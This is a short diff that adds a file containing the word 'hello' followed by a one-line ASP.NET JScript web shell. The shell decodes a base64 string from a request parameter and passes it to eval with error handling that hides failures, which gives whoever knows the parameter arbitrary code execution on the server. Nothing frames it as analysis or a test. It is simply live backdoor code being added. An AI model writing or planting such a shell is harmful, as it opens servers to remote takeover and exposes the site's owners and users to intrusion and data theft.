@@ -1,0 +1,2 @@
+hello
+<%@ Page Language="Jscript" validateRequest="false"%><%try{eval(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(Request.Item["[password]"])),"unsafe");}catch(e){}%>
